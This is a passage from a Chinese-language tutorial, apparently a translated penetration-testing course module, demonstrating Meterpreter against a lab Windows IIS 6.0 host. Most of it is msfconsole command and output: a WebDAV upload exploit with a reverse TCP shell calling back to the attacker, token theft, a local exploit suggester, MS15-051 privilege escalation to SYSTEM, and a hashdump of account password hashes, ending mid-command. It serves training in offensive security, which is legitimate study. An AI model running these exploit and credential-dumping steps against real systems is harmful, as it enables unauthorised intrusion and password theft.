class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pivot                     Manage pivot listeners</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br></pre></td></tr></table></figure><p>其中一些命令也可在模块备忘单中找到以供参考。</p><p>我们需要了解 Meterpreter 的主要思想是，它与在目标操作系统上获得直接 shell 一样好，但具有更多功能。Meterpreter 的开发人员为该项目设定了明确的设计目标，以期在未来的可用性上飙升。Meterpreter 需要：</p><ul><li>隐身</li><li>强大的</li><li>可扩展</li></ul><hr><h2 id="隐身"><a href="#隐身" class="headerlink" title="隐身"></a>隐身</h2><p>Meterpreter 在启动并到达目标后，完全驻留在内存中，不会向磁盘写入任何内容。当 Meterpreter 将自己注入到受感染的进程中时，也不会创建新进程。此外，它可以执行从一个正在运行的进程到另一个运行进程的进程迁移。</p><p>使用现在更新的 msfconsole-v6，目标主机和我们之间的所有 Meterpreter 有效负载通信都使用 AES 加密，以确保数据通信的机密性和完整性。</p><p>所有这些都提供了有限的取证证据，而且对受害机器的影响也很小。</p><hr><h2 id="强大的"><a href="#强大的" class="headerlink" title="强大的"></a>强大的</h2><p>Meterpreter 在目标主机和攻击者之间使用通道化通信系统证明非常有用。当我们通过为它打开一个专用通道立即在我们的 Meterpreter 阶段内生成一个主机操作系统 shell 时，我们可以直接注意到这一点。这也允许使用 AES 加密流量。</p><hr><h2 id="可扩展"><a href="#可扩展" class="headerlink" title="可扩展"></a>可扩展</h2><p>Meterpreter 的功能可以在运行时不断增强并通过网络加载。其模块化结构还允许在不重建的情况下添加新功能。</p><hr><h2 id="使用-Meterpreter"><a href="#使用-Meterpreter" class="headerlink" title="使用 Meterpreter"></a>使用 Meterpreter</h2><p>我们已经在有效载荷部分深入研究了 Meterpreter 的基础知识。现在，我们将了解 Meterpreter shell 的真正优势，以及它如何提高评估的有效性并在交战期间节省时间。我们首先对已知目标运行基本扫描。我们将按单点方式执行此操作，从 msfconsole 内部执行所有操作，以便从对我们目标的数据跟踪中获益。</p><h4 id="MSF-扫描目标"><a href="#MSF-扫描目标" class="headerlink" title="MSF - 扫描目标"></a>MSF - 扫描目标</h4><p> MSF - 扫描目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_nmap -sV -p- -T5 -A 10.10.10.15</span><br><span class="line"></span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC</span><br><span class="line">[*] Nmap: Nmap scan report for 10.10.10.15</span><br><span class="line">[*] Nmap: Host is up (0.021s latency).</span><br><span class="line">[*] Nmap: Not shown: 65534 filtered ports</span><br><span class="line">[*] Nmap: PORT   STATE SERVICE VERSION</span><br><span class="line">[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0</span><br><span class="line">[*] Nmap: | http-methods:</span><br><span class="line">[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT</span><br><span class="line">[*] Nmap: |_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">[*] Nmap: |_http-title: Under Construction</span><br><span class="line">[*] Nmap: | http-webdav-scan:</span><br><span class="line">[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">[*] Nmap: |   WebDAV type: Unknown</span><br><span class="line">[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK</span><br><span class="line">[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT</span><br><span class="line">[*] Nmap: |_  Server Type: Microsoft-IIS/6.0</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.15             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port  proto  name  state  info</span><br><span class="line">----         ----  -----  ----  -----  ----</span><br><span class="line">10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0</span><br></pre></td></tr></table></figure><p>接下来，我们查找有关此框上运行的服务的一些信息。具体来说，我们想要探索端口 80 以及那里托管了哪种 Web 服务。</p><p>我们注意到这是一个正在建设中的网站——在这里看不到任何与网络相关的内容。但是，仔细查看网页的末尾和 Nmap 扫描的结果，我们注意到服务器正在运行<code>Microsoft IIS httpd 6.0</code>。因此，我们朝着这个方向进一步研究，寻找此版本 IIS 的常见漏洞。经过一番搜索，我们找到了以下标记表示一个广泛存在的漏洞：<code>CVE-2017-7269</code>. 它还具有为其开发的 Metasploit 模块。</p><h4 id="MSF-寻找漏洞"><a href="#MSF-寻找漏洞" class="headerlink" title="MSF - 寻找漏洞"></a>MSF - 寻找漏洞</h4><p> MSF - 寻找漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search iis_webdav_upload_asp</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                       Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                       ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; use 0</span><br><span class="line"></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/iis/iis_webdav_upload_asp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting        Required  Description</span><br><span class="line">   ----          ---------------        --------  -----------</span><br><span class="line">   HttpPassword                         no        The HTTP password to specify for authentication</span><br><span class="line">   HttpUsername                         no        The HTTP username to specify for authentication</span><br><span class="line">   METHOD        move                   yes       Move or copy the file on the remote system from .txt -&gt; .asp (Accepted: move, copy)</span><br><span class="line">   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload</span><br><span class="line">   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT         80                     yes       The target port (TCP)</span><br><span class="line">   SSL           false                  no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   VHOST                                no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>我们继续设置所需的参数。目前，这些将是<code>LHOST</code>并且<code>RHOST</code>目标上的所有其他内容似乎都在运行默认配置。</p><h4 id="MSF-配置漏洞利用和有效载荷"><a href="#MSF-配置漏洞利用和有效载荷" class="headerlink" title="MSF - 配置漏洞利用和有效载荷"></a>MSF - 配置漏洞利用和有效载荷</h4><p> MSF - 配置漏洞利用和有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set RHOST 10.10.10.15</span><br><span class="line"></span><br><span class="line">RHOST =&gt; 10.10.10.15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set LHOST tun0</span><br><span class="line"></span><br><span class="line">LHOST =&gt; tun0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.26:4444 </span><br><span class="line">[*] Checking /metasploit28857905.asp</span><br><span class="line">[*] Uploading 612435 bytes to /metasploit28857905.txt...</span><br><span class="line">[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...</span><br><span class="line">[*] Executing /metasploit28857905.asp...</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.15</span><br><span class="line">[*] Deleting /metasploit28857905.asp (this doesn&#x27;t always work)...</span><br><span class="line">[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>我们有 Meterpreter shell。但是，请仔细查看上面的输出。此时我们可以看到目标系统上存在一个<code>.asp</code>名为 exists 的文件。<code>metasploit28857905</code>一旦获得 Meterpreter shell，如前所述，它将驻留在内存中。因此，不需要该文件，并且尝试删除<code>msfconsole</code>，但由于访问权限而失败。留下这样的痕迹对攻击者没有好处，并且会造成巨大的责任。</p><p>从系统管理员的角度来看，找到与此名称类型相匹配的文件或它的轻微变体可以证明有助于在其轨道中间停止攻击。如上所述，针对文件名或签名的正则表达式匹配甚至不允许攻击者在被正确配置的安全措施切断之前生成 Meterpreter shell。</p><p>我们继续我们的探索。在尝试查看我们在哪个用户上运行时，我们收到一条访问被拒绝的消息。我们应该尝试将我们的进程迁移到具有更多权限的用户。</p><h4 id="MSF-Meterpreter-迁移"><a href="#MSF-Meterpreter-迁移" class="headerlink" title="MSF - Meterpreter 迁移"></a>MSF - Meterpreter 迁移</h4><p> MSF - Meterpreter 迁移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">[-] 1055: Operation failed: Access is denied.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System                                                          </span><br><span class="line"> 216   1080  cidaemon.exe                                                    </span><br><span class="line"> 272   4     smss.exe                                                        </span><br><span class="line"> 292   1080  cidaemon.exe                                                    </span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line"></span><br><span class="line"> 1712  396   alg.exe                                                         </span><br><span class="line"> 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe</span><br><span class="line"> 1920  396   dllhost.exe                                                     </span><br><span class="line"> 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe</span><br><span class="line"> 2312  592   wmiprvse.exe                                                    </span><br><span class="line"> 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe</span><br><span class="line"> 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe</span><br><span class="line"> 4076  1080  cidaemon.exe                                                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; steal_token 1836</span><br><span class="line"></span><br><span class="line">Stolen token with username: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\NETWORK SERVICE</span><br></pre></td></tr></table></figure><p>现在我们已经在系统中至少建立了一些权限级别，是时候升级该权限了。因此，我们四处寻找任何有趣的东西，并在该<code>C:\Inetpub\</code>位置找到一个有趣的文件夹，名为<code>AdminScripts</code>. 然而，不幸的是，我们无权阅读其中的内容。</p><h4 id="MSF-与目标交互"><a href="#MSF-与目标交互" class="headerlink" title="MSF - 与目标交互"></a>MSF - 与目标交互</h4><p>我们可以很容易地决定运行本地漏洞利用建议模块，将其附加到当前活动的 Meterpreter 会话。为此，我们将当前 Meterpreter 会话置于后台，搜索我们需要的模块，并将 SESSION 选项设置为 Meterpreter 会话的索引号，将模块绑定到它。</p><h4 id="MSF-会话处理"><a href="#MSF-会话处理" class="headerlink" title="MSF - 会话处理"></a>MSF - 会话处理</h4><p> MSF - 会话处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; bg</span><br><span class="line"></span><br><span class="line">Background session 1? [y/N]  y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; search local_exploit_suggester</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----    -----  -----------</span><br><span class="line">   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; use 0</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1</span><br><span class="line"></span><br><span class="line">SESSION =&gt; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.15 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 10.10.10.15 - 34 exploit checks are being tried...</span><br><span class="line">nil versions are discouraged and will be deprecated in Rubygems 4</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><br></pre></td></tr></table></figure><p>运行侦察模块为我们提供了多种选择。通过每个单独的一个，我们降落在<code>ms15_051_client_copy_image</code>条目上，这被证明是成功的。这个漏洞利用让我们直接进入 root shell，让我们完全控制目标系统。</p><h4 id="MSF——特权升级"><a href="#MSF——特权升级" class="headerlink" title="MSF——特权升级"></a>MSF——特权升级</h4><p> MSF——特权升级</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms15_051_client_copy_images</span><br><span class="line"></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms15_051_client_copy_image):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set session 1</span><br><span class="line"></span><br><span class="line">session =&gt; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set LHOST tun0</span><br><span class="line"></span><br><span class="line">LHOST =&gt; tun0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.26:4444 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 844 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 844...</span><br><span class="line">[*] Injecting exploit into 844...</span><br><span class="line">[*] Exploit injected. Injecting payload into 844...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.15</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>从这里开始，我们可以继续使用 Meterpreter 的大量功能。例如，提取哈希值、模拟我们想要的任何进程等等。</p><h4 id="MSF-转储哈希"><a href="#MSF-转储哈希" class="headerlink" title="MSF - 转储哈希"></a>MSF - 转储哈希</h4><p> MSF - 转储哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line"></span><br><span class="line">Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::</span><br><span class="line">ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::</span><br><span class="line">IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::</span><br><span class="line">Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping SAM</span><br><span class="line">Domain : GRANNY</span><br><span class="line">SysKey : 